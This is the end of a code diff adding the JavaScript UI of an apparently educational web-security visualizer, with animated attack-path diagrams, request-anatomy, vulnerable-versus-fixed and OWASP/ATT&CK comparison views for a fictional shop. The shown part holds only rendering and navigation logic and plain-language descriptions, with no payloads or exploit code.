+          const px=Math.max(4,Math.min(this.vbw-w-4,x-w/2)),py=Math.max(2,y-34);this.pill.setAttribute("transform",`translate(${px},${py})`);}}
+      this.raf=requestAnimationFrame(loop);
+    };
+    this.raf=requestAnimationFrame(loop);
+  }
+  stop(){cancelAnimationFrame(this.raf);}
+}
+function seqDiagram(Ac,rows,aria){
+  const n=Ac.length,W=Math.max(380,n*150),LW=(W-20)/n,X=i=>10+LW*(i+.5),xi=id=>X(Ac.findIndex(a=>a[0]===id));
+  const H=58+rows.length*36+6;
+  const box=document.createElement("div");box.className="pc-svg";
+  const svg=S("svg",{viewBox:`0 0 ${W} ${H}`,role:"img","aria-label":aria,style:`min-width:${Math.round(W*.85)}px`},box);
+  Ac.forEach((a,i)=>{S("text",{class:"lane-h",x:X(i),y:18,"text-anchor":"middle"},svg,a[1]);S("text",{class:"lane-s",x:X(i),y:33,"text-anchor":"middle"},svg,a[2]);S("line",{class:"lifeline",x1:X(i),x2:X(i),y1:42,y2:H-2},svg);});
+  const items=[];
+  rows.forEach((r,ri)=>{const y=70+ri*36;
+    if(r[1]==="="){const x=xi(r[0]),w=Math.min(W-12,r[2].length*6.4+18),cx=Math.max(6+w/2,Math.min(W-6-w/2,x));const g=S("g",{class:"snote"},svg);S("rect",{x:cx-w/2,y:y-15,width:w,height:22,rx:5},g);S("text",{x:cx,y:y,"text-anchor":"middle"},g,r[2]);}
+    else{const x1=xi(r[0]),x2=xi(r[1]),dir=x2>x1?1:-1;
+      S("line",{class:"arrow",x1,y1:y,x2:x2-dir*7,y2:y},svg);S("polygon",{class:"arrowhead",points:`${x2},${y} ${x2-dir*9},${y-5} ${x2-dir*9},${y+5}`},svg);
+      const lw=r[2].length*6.3,cx=Math.max(6+lw/2,Math.min(W-6-lw/2,(x1+x2)/2));
+      S("text",{class:"alabel",x:cx,y:y-7,"text-anchor":"middle"},svg,r[2]);items.push({pts:[[x1,y],[x2,y]],label:r[2]});}
+  });
+  const layer=S("g",{},svg);
+  return {box,flow:new Flow(layer,items,{label:false,vbw:W})};
+}
+function linkPts(g,l){const a=g.nodes[l[0]],b=g.nodes[l[1]];return [[a.x,a.y],...(l[2]||[]),[b.x,b.y]];}
+function route(g,from,to){
+  if(from===to)return [from];
+  const adj={};g.links.forEach(l=>{(adj[l[0]]=adj[l[0]]||[]).push(l[1]);(adj[l[1]]=adj[l[1]]||[]).push(l[0]);});
+  const prev={[from]:null},q=[from];
+  while(q.length){const n=q.shift();if(n===to)break;(adj[n]||[]).forEach(m=>{if(!(m in prev)){prev[m]=n;q.push(m);}});}
+  const path=[];let c=to;while(c!=null){path.unshift(c);c=prev[c];}return path;
+}
+function pathPts(g,nodes){let pts=[];for(let i=0;i<nodes.length-1;i++){const a=nodes[i],b=nodes[i+1];const l=g.links.find(l=>(l[0]===a&&l[1]===b)||(l[0]===b&&l[1]===a));let p=linkPts(g,l);if(l[0]!==a)p=p.slice().reverse();pts=pts.concat(i?p.slice(1):p);}return pts;}
+function drawGraph(host,g,msgs,{aria=""}={}){
+  const box=document.createElement("div");box.className="scroll-x";host.appendChild(box);
+  const svg=S("svg",{viewBox:`0 0 ${g.vb[0]} ${g.vb[1]}`,role:"img","aria-label":aria},box);
+  (g.frames||[]).forEach(f=>{S("rect",{class:"frame",x:f.x,y:f.y,width:f.w,height:f.h,rx:12},svg);S("text",{class:"frame-lbl",x:f.x+12,y:f.y+16},svg,f.label);});
+  const active=new Set(),hot=new Set();
+  msgs.forEach(m=>{const r=route(g,m[0],m[1]);r.forEach(n=>active.add(n));for(let i=0;i<r.length-1;i++)hot.add([r[i],r[i+1]].sort().join("|"));});
+  g.links.forEach(l=>{const p=linkPts(g,l);S("polyline",{class:"link"+(hot.has([l[0],l[1]].sort().join("|"))?" hot":""),points:p.map(q=>q.join(",")).join(" ")},svg);
+    if(l[3]){const a=l[2]?p[1]:p[0],b=l[2]?p[1]:p[p.length-1];S("text",{class:"link-lbl",x:(a[0]+b[0])/2+(l[2]?-6:0),y:(a[1]+b[1])/2-8,"text-anchor":l[2]?"end":"middle"},svg,l[3]);}});
+  for(const id in g.nodes){const n=g.nodes[id];const G=S("g",{class:"node"+(active.has(id)?" on":" dim")+(n.evil?" evil":""),transform:`translate(${n.x-NW/2},${n.y-NH/2})`},svg);
+    S("rect",{width:NW,height:NH,rx:9},G);S("text",{class:"t",x:NW/2,y:22,"text-anchor":"middle"},G,n.t);S("text",{class:"s",x:NW/2,y:39,"text-anchor":"middle"},G,n.s);}
+  const layer=S("g",{},svg);
+  const ol=document.createElement("ol");ol.className="log";
+  ol.innerHTML=msgs.map((m,i)=>`<li data-i="${i}"><span class="n">${i+1}</span><span><span class="who">${esc(g.nodes[m[0]].t)} → ${esc(g.nodes[m[1]].t)}</span><br>${esc(m[2])}</span></li>`).join("");
+  host.appendChild(ol);
+  const flow=new Flow(layer,msgs.map(m=>({pts:pathPts(g,route(g,m[0],m[1])),label:m[2]})),{onActive:i=>ol.querySelectorAll("li[data-i]").forEach(li=>li.classList.toggle("act",+li.dataset.i===i)),vbw:g.vb[0]});
+  flow.start();return flow;
+}
+function cycler(els,show,ms=3400){let idx=0,t=null;const go=i=>{idx=i;els.forEach((e,j)=>e.classList.toggle("on",j===i));show(i);};
+  els.forEach((e,i)=>e.addEventListener("click",()=>go(i)));if(els.length)go(0);
+  const tick=()=>{if(!ANIM.paused&&els.length)go((idx+1)%els.length);t=setTimeout(tick,ms);};if(!reduced)t=setTimeout(tick,ms);
+  return {stop(){clearTimeout(t);}};}
+const head=(host,title,hint)=>{const h=document.createElement("div");h.className="viz-head";h.innerHTML=`<h2>${title}</h2><span class="hint">${hint}</span>`;host.appendChild(h);};
+const owaspChips=id=>`<span class="chip">${esc(A[id].o25)}</span><span class="chip">${esc(A[id].cwe)}</span>`;
+
+/* Attack picker, shown above every comparison view. */
+function picker(host){
+  const d=document.createElement("details");d.className="picker";d.open=state.pickerOpen;
+  d.addEventListener("toggle",()=>{state.pickerOpen=d.open;});
+  d.innerHTML=`<summary>Compare: ${state.sel.map(id=>esc(A[id].short)).join(" · ")} <span>(choose 1–4 attacks)</span></summary>`+
+    FAMS.map(f=>`<div class="fam"><span class="fl">${esc(f)}</span>${Object.keys(A).filter(id=>A[id].fam===f).map(id=>`<button type="button" class="achip" style="--c:${col(id)}" data-pick="${id}" aria-pressed="${state.sel.includes(id)}">${esc(A[id].short)}<small>${esc(A[id].o25.split(" ")[0])}</small></button>`).join("")}</div>`).join("");
+  host.appendChild(d);
+}
+
+/* ============================================================
+   VIEW · HIGH LEVEL
+   ============================================================ */
+const HighView={
+  label:"High level",short:"Who gets hurt?",groups:false,
+  desc:"Five kinds of target, in plain language: the server, other users, systems behind the server, accounts, and the supply chain. Click a target, or an attack to compare it with similar ones.",
+  steps(){return TARGETS.map(t=>t.name.replace("The ","").replace("Other users' browsers","Users' browsers"));},
+  render(host){
+    const T=TARGETS[state.i],ids=Object.keys(A).filter(id=>A[id].target===T.id);
+    host.style.setProperty("--c",T.color);
+    head(host,esc(T.name),"Moving dots: the attack travelling through a fictional shop");
+    const msgs={server:[["att","app","malicious input"],["app","db","database misreads it"],["app","os","or the shell does"]],
+      browser:[["att","app","store a script / lure"],["vic","app","victim visits the shop"],["app","vic","page carries the attack"]],
+      internal:[["att","app","\"please fetch this URL\""],["app","internal","server reaches inside"],["app","att","internal data comes back"]],
+      access:[["att","app","someone else's ID or password"],["app","db","no check fails"],["app","att","their data"]],
+      supply:[["att","registry","poisoned package"],["registry","ci","build pulls it in"],["ci","app","shipped to production"]]}[T.id];
+    this.flow=drawGraph(host,SHOP,msgs,{aria:`How attacks on ${T.name.toLowerCase()} travel`});
+    host.insertAdjacentHTML("beforeend",`<h3 class="sub">Who gets hurt?</h3><p class="subtext">Pick a target. Its attacks are listed below it; click one to compare it with its neighbours.</p>`);
+    const g=document.createElement("div");g.className="targets";
+    g.innerHTML=TARGETS.map((t,i)=>`<button type="button" class="tcard${i===state.i?" on":""}" style="--c:${t.color}" data-target="${i}"><b>${esc(t.name)}</b><span>${esc(t.line)}</span></button>`).join("");
+    host.appendChild(g);
+    host.insertAdjacentHTML("beforeend",`<h3 class="sub">Attacks on ${esc(T.name.toLowerCase())}</h3><div class="alist">${ids.map(id=>`<button type="button" class="achip" style="--c:${col(id)}" data-focus="${id}">${esc(A[id].name)}<small>${esc(A[id].o25.split(" ")[0])}</small></button>`).join("")}</div>`);
+  },
+  notes(n){const T=TARGETS[state.i],ids=Object.keys(A).filter(id=>A[id].target===T.id);n.style.setProperty("--c",T.color);
+    return `<p class="kicker">Target ${state.i+1} of ${TARGETS.length} · High level</p><h2>${esc(T.name)}</h2><p class="sum">${esc(T.line)}</p>${T.text.map(t=>`<p>${esc(t)}</p>`).join("")}
+      <div class="say"><h3>Everyday comparison</h3><p>${esc(T.analogy)}</p></div>
+      <h3>The attacks, in one line each</h3><ul>${ids.map(id=>`<li><b>${esc(A[id].name)}:</b> ${esc(A[id].plain)} <i>${esc(A[id].analogy)}</i></li>`).join("")}</ul>
+      <h3>Remember</h3><p>${esc(T.remember)}</p>`;},
+  stop(){this.flow&&this.flow.stop();}
+};
+
+/* ============================================================
+   VIEW · SIDE BY SIDE
+   ============================================================ */
+const SideView={
+  label:"Side by side",short:"Compare phase by phase",groups:true,
+  desc:"Your chosen attacks going through the same phase at the same time: the flaw, discovery, the exploit, where the code runs, the impact, and detection and fix.",
+  steps(){return PHASES.map(p=>p.name);},
+  render(host){
+    const ph=PHASES[state.i];picker(host);
+    head(host,`${esc(ph.name)}`,esc(ph.q));
+    const grid=document.createElement("div");grid.className="pgrid";host.appendChild(grid);
+    this.flows=state.sel.map(id=>{const a=A[id],p=a.ph[ph.id];
+      const card=document.createElement("div");card.className="pcard";card.style.setProperty("--c",col(id));
+      card.innerHTML=`<div class="pc-head"><b>${esc(a.name)}</b><span class="tag">${esc(a.o25.split(" (")[0])}</span></div>`;
+      const d=seqDiagram(a.actors,p.s,`${a.name}: ${ph.name}`);card.appendChild(d.box);
+      card.insertAdjacentHTML("beforeend",`<p class="pc-text">${esc(p.t)}</p>`);grid.appendChild(card);d.flow.start();return d.flow;});
+  },
+  notes(n){const ph=PHASES[state.i];n.style.setProperty("--c","var(--accent)");
+    const pr=PRESETS[state.group];
+    return `<p class="kicker">Phase ${state.i+1} of ${PHASES.length}${pr?" · "+esc(pr.name):""}</p><h2>${esc(ph.name)}</h2><p class="sum">${esc(ph.q)}</p><p>${esc(ph.text)}</p>
+      ${pr?`<div class="say"><h3>Why compare these</h3><p>${esc(pr.q)}</p></div>`:""}
+      <h3>Quick contrast</h3><ul>${state.sel.map(id=>`<li><b>${esc(A[id].short)}:</b> ${esc(ph.ck?A[id].cmp[ph.ck]:A[id].plain)}</li>`).join("")}</ul>`;},
+  stop(){(this.flows||[]).forEach(f=>f.stop());}
+};
+
+/* ============================================================
+   VIEW · REQUEST ANATOMY
+   ============================================================ */
+const ReqView={
+  label:"Request anatomy",short:"The malicious bytes",groups:true,
+  desc:"The actual request (or manifest, or stored row) behind each attack, with the malicious part highlighted. Click any highlighted part to read what it does.",
+  steps(){return state.sel.map(id=>A[id].short);},
+  render(host){
+    const id=state.sel[state.i],a=A[id];host.style.setProperty("--c",col(id));picker(host);
+    head(host,esc(a.name),`${esc(a.o25)} · ${esc(a.cwe)}`);
+    host.insertAdjacentHTML("beforeend",`<div class="rlegend"><span><i style="background:color-mix(in srgb,var(--warn) 30%,transparent)"></i>attacker's payload</span><span><i style="background:color-mix(in srgb,var(--accent) 28%,transparent)"></i>context that makes it work</span></div>`);
+    const box=document.createElement("div");box.className="req";
+    const segs=[];
+    a.req.forEach(line=>{const ln=document.createElement("div");ln.className="ln";
+      line.forEach(s=>{if(typeof s==="string"){ln.appendChild(document.createTextNode(s));}
+        else{const b=document.createElement("button");b.type="button";b.className="seg "+s[1];b.textContent=s[0];ln.appendChild(b);segs.push({el:b,s});}});
+      if(!line.length||(line.length===1&&line[0]===""))ln.innerHTML="&nbsp;";box.appendChild(ln);});
+    host.appendChild(box);
+    const det=document.createElement("div");det.className="rdetail";det.setAttribute("aria-live","polite");host.appendChild(det);
+    this.h=cycler(segs.map(x=>x.el),i=>{const s=segs[i].s;det.innerHTML=`<code>${esc(s[0])}</code><p>${esc(s[2])}</p>`;});
+  },
+  notes(n){const id=state.sel[state.i],a=A[id];n.style.setProperty("--c",col(id));
+    return `<p class="kicker">Request anatomy · ${state.i+1} of ${state.sel.length}</p><h2>${esc(a.name)}</h2><p class="sum">${esc(a.plain)}</p>
+      <div class="facts">${owaspChips(id)}<span class="chip">2021: ${esc(a.o21)}</span></div>
+      <p>${esc(a.ph.exploit.t)}</p><div class="say"><h3>Why it works</h3><p>${esc(a.ph.flaw.t)}</p></div>
+      <h3>How to stop it</h3><p>${esc(a.ph.defend.t)}</p>`;},
+  stop(){this.h&&this.h.stop();}
+};
+
+/* ============================================================
+   VIEW · ATTACK PATH
+   ============================================================ */
+const PathView={
+  label:"Attack path",short:"Where it travels",groups:true,
+  desc:"Each chosen attack on the same map of a fictional shop: attacker, victim, firewall, web app, database, server OS, internal services and the supply chain.",
+  steps(){return state.sel.map(id=>A[id].short);},
+  render(host){
+    const id=state.sel[state.i],a=A[id];host.style.setProperty("--c",col(id));picker(host);
+    head(host,esc(a.name),"Highlighted boxes take part · moving dots follow the attack");
+    this.flow=drawGraph(host,SHOP,a.path,{aria:`Attack path of ${a.name}`});
+  },
+  notes(n){const id=state.sel[state.i],a=A[id],T=TARGETS[TI[a.target]];n.style.setProperty("--c",col(id));
+    return `<p class="kicker">Attack path · ${esc(T.name)}</p><h2>${esc(a.name)}</h2><p class="sum">${esc(a.plain)}</p>
+      <div class="facts">${owaspChips(id)}</div>
+      <h3>Where it runs</h3><p>${esc(a.ph.executes.t)}</p><h3>Impact</h3><p>${esc(a.ph.impact.t)}</p>
+      <div class="say"><h3>What usually comes next (MITRE ATT&amp;CK)</h3><p>${esc(a.cmp.attck)}</p></div>`;},
+  stop(){this.flow&&this.flow.stop();}
+};
+
+/* ============================================================
+   VIEW · VULNERABLE VS FIXED
+   ============================================================ */
+const FixView={
+  label:"Vulnerable vs fixed",short:"The line that matters",groups:true,
+  desc:"Short code (or configuration) for each chosen attack: the vulnerable version next to the fixed one, with the lines that make the difference highlighted.",
+  steps(){return null;},
+  render(host){
+    picker(host);head(host,"Vulnerable vs fixed","Red: the cause · green: the fix");
+    state.sel.forEach(id=>{const a=A[id],c=a.code;
+      const lines=(arr,hl,cls)=>arr.map((l,i)=>`<div class="l${hl.includes(i)?" "+cls:""}">${esc(l)||" "}</div>`).join("");
+      host.insertAdjacentHTML("beforeend",`<div class="fixcard" style="--c:${col(id)}"><h3>${esc(a.name)} <span class="tag">${esc(c.lang)}</span></h3>
+        <div class="fixcols"><div class="code" style="--k:var(--warn)"><div class="h">Vulnerable</div>${lines(c.v,c.hv,"bad")}</div><div class="code" style="--k:var(--good)"><div class="h">Fixed</div>${lines(c.f,c.hf,"good")}</div></div>
+        <p class="fixnote">${esc(c.note)}</p></div>`);});
+  },
+  notes(n){n.style.setProperty("--c","var(--accent)");const pr=PRESETS[state.group];
+    return `<p class="kicker">Vulnerable vs fixed${pr?" · "+esc(pr.name):""}</p><h2>Fix the cause, not the symptom</h2>
+      <p class="sum">Most of these fixes are a single line, because the root cause is a single wrong assumption.</p>
+      <ul>${state.sel.map(id=>`<li><b>${esc(A[id].short)}:</b> ${esc(A[id].cmp.fix)}</li>`).join("")}</ul>
+      <div class="say"><h3>Rule of thumb</h3><p>Keep data and code apart (injection), check permission on every request (access), distrust anything you didn't build (supply chain), and fail closed.</p></div>
+      <p>Firewalls and filters are useful extra layers, but they block known patterns; the code fix removes the weakness.</p>`;},
+  stop(){}
+};
+
+/* ============================================================
+   VIEW · COMPARE TABLE
+   ============================================================ */
+const ROWS=[["o25","OWASP 2025",1],["o21","OWASP 2021",1],["cwe","CWE",1],["target","Target",2],["root","Root cause"],["runs","Where it runs"],["impact","Impact"],["detect","Detection"],["fix","Fix"],["attck","ATT&CK follow-up"]];
+const CompareView={
+  label:"Compare",short:"The table",groups:true,
+  desc:"Your chosen attacks against the same questions, including their OWASP 2025 and 2021 categories, CWE numbers and typical MITRE ATT&CK follow-up techniques.",
+  steps(){return null;},
+  render(host){
+    picker(host);head(host,"Side-by-side table","OWASP numbers: Top 10:2025, with 2021 for comparison");
+    const val=(id,k,t)=>t===1?A[id][k]:t===2?TARGETS[TI[A[id].target]].name:A[id].cmp[k];
+    const box=document.createElement("div");box.className="scroll-x";
+    box.innerHTML=`<table class="ctable"><thead><tr><th></th>${state.sel.map(id=>`<th scope="col" style="--c:${col(id)}">${esc(A[id].name)}<small>${esc(A[id].short)}</small></th>`).join("")}</tr></thead><tbody>`+
+      ROWS.map(([k,l,t])=>`<tr><th scope="row">${esc(l)}</th>${state.sel.map(id=>`<td>${esc(val(id,k,t))}</td>`).join("")}</tr>`).join("")+`</tbody></table>`;
+    host.appendChild(box);
+  },
+  notes(n){n.style.setProperty("--c","var(--accent)");const pr=PRESETS[state.group];
+    return `<p class="kicker">Compare${pr?" · "+esc(pr.name):" · your selection"}</p><h2>${pr?esc(pr.name):"Your comparison"}</h2>${pr?`<p class="sum">${esc(pr.q)}</p>`:""}
+      <h3>Reading the OWASP rows</h3><p>The Top 10 groups weaknesses into broad categories ranked by how often and how badly they occur. Between 2021 and 2025, SSRF was merged into Broken Access Control, Vulnerable Components became Software Supply Chain Failures, and Mishandling of Exceptional Conditions is new.</p>
+      <h3>CWE and ATT&amp;CK</h3><p>CWE names the precise weakness in code. MITRE ATT&amp;CK describes attacker behaviour: most web attacks start as T1190, "Exploit Public-Facing Application", and the follow-up techniques show what attackers do with the foothold.</p>`;},
+  stop(){}
+};
+
+/* ============================================================
+   APP SHELL
+   ============================================================ */
+const VIEWS={overview:HighView,side:SideView,request:ReqView,path:PathView,fix:FixView,compare:CompareView};
+const state={view:"overview",group:"sqlxss",sel:[...PRESETS.sqlxss.a],i:0,pickerOpen:false,playing:false,timer:null};
+let active=null;
+function buildTabs(){
+  const t=document.getElementById("tabs");
+  const tab=k=>`<button class="tab" role="tab" type="button" id="tab-${k}" data-view="${k}" aria-selected="false"><b>${VIEWS[k].label}</b><span>${VIEWS[k].short}</span></button>`;
+  t.innerHTML=tab("overview")+`<div class="tab-group" role="group" aria-label="Interview depth"><span class="tg-label">Interview</span>${["side","request","path","fix","compare"].map(tab).join("")}</div>`
+    +`<button class="tab" type="button" disabled title="Planned next: ATT&CK chains, browser security model (same-origin, cookies, CSP), how firewalls see requests, OWASP 2021 → 2025"><b>Deep internals</b><span>coming next</span></button>`;
+  t.addEventListener("click",e=>{const b=e.target.closest("[data-view]");if(b)setView(b.dataset.view,true);});
+}
+function steps(){return VIEWS[state.view].steps();}
+function renderRail(){
+  const v=VIEWS[state.view],gEl=document.getElementById("groups"),sEl=document.getElementById("steps");
+  gEl.hidden=!v.groups;
+  gEl.innerHTML=PRESET_IDS.map(g=>`<button type="button" class="gbtn${g===state.group?" on":""}" data-group="${g}" aria-pressed="${g===state.group}">${esc(PRESETS[g].name)}<small>${esc(PRESETS[g].short)}</small></button>`).join("")
+    +(state.group==="custom"?`<button type="button" class="gbtn on" aria-pressed="true">Your pick<small>${state.sel.length} attacks</small></button>`:"");
+  const st=steps();
+  sEl.innerHTML=st?st.map((s,i)=>`<button type="button" class="sbtn${i===state.i?" on":""}" data-step="${i}"><i>${i+1}</i>${esc(s)}</button>`).join(""):"";
+  const gi=PRESET_IDS.indexOf(state.group),gl=gi<0?"your pick":`preset ${gi+1}/${PRESET_IDS.length}`;
+  document.getElementById("counter").textContent=st?`${state.i+1} / ${st.length}`+(v.groups?` · ${gl}`:""):gl;
+}
+function render(){
+  if(active)active.stop();
+  const host=document.getElementById("viz");host.innerHTML="";host.style.removeProperty("--c");
+  active=VIEWS[state.view];active.render(host);
+  const n=document.getElementById("notes");n.innerHTML=active.notes(n);n.scrollTop=0;
+  renderRail();
+  store.set("wa-sel",JSON.stringify({g:state.group,s:state.sel}));
+}
+function go(i){const st=steps();state.i=st?Math.max(0,Math.min(st.length-1,i)):0;render();if(state.playing)schedule();}
+function setGroup(g,i=0){state.group=g;state.sel=[...PRESETS[g].a];state.i=i;render();if(state.playing)schedule();}
+function togglePick(id){
+  const s=state.sel.slice(),k=s.indexOf(id);
+  if(k>=0){if(s.length>1)s.splice(k,1);}else{s.push(id);if(s.length>4)s.shift();}
+  state.sel=s;state.group=PRESET_IDS.find(g=>PRESETS[g].a.join()===s.join())||"custom";
+  const st=steps();if(st)state.i=Math.min(state.i,st.length-1);render();
+}
+/* Next/previous: through the view's steps, then on to the next preset; loops for Auto-advance. */
+function stepBy(d){
+  const v=VIEWS[state.view],st=steps();
+  if(st&&state.i+d>=0&&state.i+d<st.length){go(state.i+d);return;}
+  if(!v.groups){go(st?(state.i+d+st.length)%st.length:0);return;}
+  const gi=PRESET_IDS.indexOf(state.group),ng=PRESET_IDS[((gi<0?(d>0?-1:0):gi)+d+PRESET_IDS.length)%PRESET_IDS.length];
+  state.group=ng;state.sel=[...PRESETS[ng].a];const ns=steps();setGroup(ng,d>0||!ns?0:ns.length-1);
+}
+function setView(v,push){
+  if(!VIEWS[v])v="overview";
+  if(v!==state.view)state.i=0;
+  state.view=v;
+  document.querySelectorAll(".tab[data-view]").forEach(t=>t.setAttribute("aria-selected",String(t.dataset.view===v)));
+  document.getElementById("viewdesc").textContent=VIEWS[v].desc;
+  if(push&&location.hash!=="#"+v){try{history.replaceState(null,"","#"+v);}catch(e){location.hash=v;}}
+  render();if(state.playing)schedule();
+}
+function schedule(){
+  clearTimeout(state.timer);
+  const d=state.view==="side"?16000:12000,b=document.getElementById("auto");
+  b.style.setProperty("--adv",d+"ms");b.classList.remove("on");void b.offsetWidth;b.classList.add("on");
+  state.timer=setTimeout(()=>stepBy(1),d);
+}
+function togglePlay(on){state.playing=on??!state.playing;const b=document.getElementById("auto");b.classList.toggle("on",state.playing);b.setAttribute("aria-pressed",String(state.playing));if(state.playing)schedule();else clearTimeout(state.timer);}
+function toggleAnim(p){
+  ANIM.paused=p??!ANIM.paused;document.documentElement.classList.toggle("anim-paused",ANIM.paused);
+  const b=document.getElementById("anim");b.textContent=ANIM.paused?"Play animation":"Pause animation";b.setAttribute("aria-pressed",String(ANIM.paused));
+  b.title=ANIM.paused?"Resume the animations (space)":"Pause the animations (space)";store.set("wa-paused",ANIM.paused?"1":"0");
+}
+
+buildTabs();
+document.getElementById("groups").addEventListener("click",e=>{const b=e.target.closest("[data-group]");if(b)setGroup(b.dataset.group);});
+document.getElementById("steps").addEventListener("click",e=>{const b=e.target.closest("[data-step]");if(b)go(+b.dataset.step);});
+document.getElementById("prev").onclick=()=>stepBy(-1);
+document.getElementById("next").onclick=()=>stepBy(1);
+document.getElementById("anim").onclick=()=>toggleAnim();
+document.getElementById("auto").onclick=()=>togglePlay();
+document.addEventListener("click",e=>{
+  const p=e.target.closest("[data-pick]");if(p){togglePick(p.dataset.pick);return;}
+  const t=e.target.closest("[data-target]");if(t){go(+t.dataset.target);return;}
+  const f=e.target.closest("[data-focus]");if(f){const id=f.dataset.focus,fam=A[id].fam;
+    const near=Object.keys(A).filter(x=>A[x].fam===fam&&x!==id).slice(0,2);state.sel=[id,...near];
+    state.group=PRESET_IDS.find(g=>PRESETS[g].a.join()===state.sel.join())||"custom";setView("side",true);}
+});
+document.addEventListener("keydown",e=>{
+  if(e.target.closest("input,textarea,select,summary"))return;
+  if(e.key==="ArrowRight"){e.preventDefault();stepBy(1);}
+  else if(e.key==="ArrowLeft"){e.preventDefault();stepBy(-1);}
+  else if(e.key===" "&&!e.target.closest("button,[role=button]")){e.preventDefault();toggleAnim();}
+});
+window.addEventListener("hashchange",()=>{const v=location.hash.slice(1);if(VIEWS[v]&&v!==state.view)setView(v,false);});
+try{const s=JSON.parse(store.get("wa-sel")||"null");if(s&&Array.isArray(s.s)&&s.s.length&&s.s.every(x=>A[x])){state.sel=s.s.slice(0,4);state.group=PRESETS[s.g]?s.g:"custom";}}catch(e){}
+setView(VIEWS[location.hash.slice(1)]?location.hash.slice(1):"overview",false);
+toggleAnim(store.get("wa-paused")==="1");
+</script>
+<script>
+/* Back link to the collection: only on GitHub Pages or a local copy, not on the single published page. */
+(function(){var h=location.hostname;if(location.protocol==="file:"||/\.github\.io$/.test(h)||h==="localhost"){var a=document.querySelector(".home-link");if(a)a.hidden=false;}})();
+</script>
